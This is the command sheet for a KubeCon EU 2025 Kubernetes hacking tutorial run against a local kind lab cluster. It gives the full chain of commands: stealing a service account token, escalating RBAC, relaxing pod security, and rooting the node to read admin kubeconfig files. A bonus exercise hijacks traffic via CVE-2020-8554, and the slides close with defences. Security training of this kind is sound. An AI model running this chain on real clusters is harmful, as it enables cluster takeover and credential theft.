# Kubecon EU 25 - Hacking up a storm - commands

This file contains all the commands you'll need for the Hacking up a storm tutorial at Kubecon EU 2025. The markdown title above the command should match what you're seeing in the slides.

### Technical Requirements

```bash
git clone https://github.com/Container-Security-Training/Kubecon-EU-25.git
```

### Setup - Set up a kind cluster

```bash
cd Kubecon-EU-25
```

```bash
kind create cluster --config kind-cluster.yaml
```

### Setup - Adding some manifests

```bash
kubectl cluster-info
```

```bash
kubectl apply -f manifests/
```

### Setup - becoming the developer!

```bash
kubectl exec -it -n dev deployments/workstation -- /bin/bash
```

```bash
kubectl get pods
```

### How did that work? - Access Checks

```bash
kubectl auth can-i --list
```

```bash
kubectl auth can-i --list -v=9
```

### Check what's running

```bash
kubectl get pods
```

```bash
kubectl get deployments
```

```bash
kubectl get replicasets
```

### Check Our Permissions - dev namespace

```bash
kubectl -n dev auth can-i --list
```

```bash
Resources         Non-Resource URLs   Resource Names   Verbs
pods/exec         []                  []               [get create]
pods/log          []                  []               [get create]
pods              []                  []               [get list create delete]
events            []                  []               [get list]
serviceaccounts   []                  []               [get list]
deployments.apps  []                  []               [get list]
replicasets.apps  []                  []               [get list]
```

### Check our permissions - kube-system namespace

```bash
kubectl -n kube-system auth can-i --list
```

### Service Accounts

```bash
kubectl get serviceaccounts
```

### Get a Token - Pod Creation

```bash
kubectl apply -f - << EOF
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: token-read
  name: token-read
  namespace: dev
spec:
  containers:
  - image: ctrsec/tools:latest
    name: token-read
  serviceAccount: rbac-manager 
EOF
```

### Get a Token - Read Token

```bash
kubectl exec token-read -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | jwt decode -
```

```bash
export TOKEN=$(kubectl exec token-read -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

### Check Permissions Again

```bash
kubectl --token=$TOKEN auth can-i --list
```

### RBAC - Namespace Admin for developers!

```bash
kubectl --token $TOKEN create role --verb='*' --resource='*.*' nsadmin
```

```bash
kubectl --token $TOKEN create rolebinding --role nsadmin --serviceaccount dev:developer nsadmin
```

```bash
kubectl auth can-i --list
```

### Modifying Namespace Labels

```bash
kubectl label ns dev pod-security.kubernetes.io/enforce=privileged --overwrite
```

### Validate our changes - did we fix our problem?

```bash
kubectl get pods
```

### Compromise the cluster

```bash
kubectl apply -f manifests/noderoot.yml
```

### Proof

```bash
kubectl exec -it noderootpod -- chroot /host
```

### Using admin.conf & super-admin.conf

```bash
kubectl --kubeconfig=/etc/kubernetes/admin.conf auth can-i --list
```

```bash
kubectl --kubeconfig=/etc/kubernetes/super-admin.conf auth can-i --list
```

### First we'll create a client pod

```bash
exit
```

```bash
exit
```

```bash
cd ~/Kubecon-EU-25/CVE-2020-8554
```

```bash
kubectl create -f client-pod.yaml
```

### Then we'll check it's connection to an important site!

```bash
kubectl -n dev exec client-pod -- curl -s http://icanhazip.com
```

### Now we'll put our attackers hats on!

```bash
kubectl create -f deployment.yaml
```

### And then a service to do the redirection

```bash
kubectl create -f service.yaml
```

### And now see if our hijacking worked

```bash
kubectl -n dev exec client-pod -- curl -s http://icanhazip.com
```


## Further Reading

- https://container-security.site
- https://talks.container-security.site
- https://raesene.github.io
- #SIG-Security & #kubernetes-security on Kubernetes slack
- #TAG-Security on CNCF slack

Notes: 

---

### Thanks!

- Marion Mccune
  - e-mail: marion.mccune@scotsts.com
  - Bluesky: @marionmccune.bsky.social
- Rory McCune
  - e-mail: rorym@mccune.org.uk
  - Mastodon: @raesene@infosec.exchange
  - Bluesky: @mccune.org.uk
- Iain Smart
  - e-mail: iain@iainsmart.co.uk
  - Bluesky: @smarticu5.bsky.social

---

### Bonus Hacking - If we have time

- Let's exploit an unpatched Kubernetes CVE from 2020
- One of the "Unpatchable 4" CVEs that exist in (almost) every cluster

---

### CVE-2020-8554

![](./images/kubernetes-networking-cve-2020-8554.png)

---

### First we'll create a client pod

- If you're still on the control plane node, exit that.
```bash
exit
```
- If you're still in the developer pod exit that too!
```bash
exit
```
```bash
cd ~/Kubecon-EU-25/CVE-2020-8554
```
```bash
kubectl create -f client-pod.yaml
```

---

### Then we'll check it's connection to an important site!

```bash
kubectl -n dev exec client-pod -- curl -s http://icanhazip.com
```

---

### Now we'll put our attackers hats on!

- First create a new namespace and a deployment to get the redirected traffic

```bash
kubectl create -f deployment.yaml
```

---

### And then a service to do the redirection

```bash
kubectl create -f service.yaml
```

---

### And now see if our hijacking worked

```bash
kubectl -n dev exec client-pod -- curl -s http://icanhazip.com
```

---

### Why did that work?

- Kubernetes uses iptables rules 
- iptables rules can be used to re-direct traffic

---

### How can we stop that happening?

- RBAC
- Admission control!
  - Restrict `externalIPs` in services. 


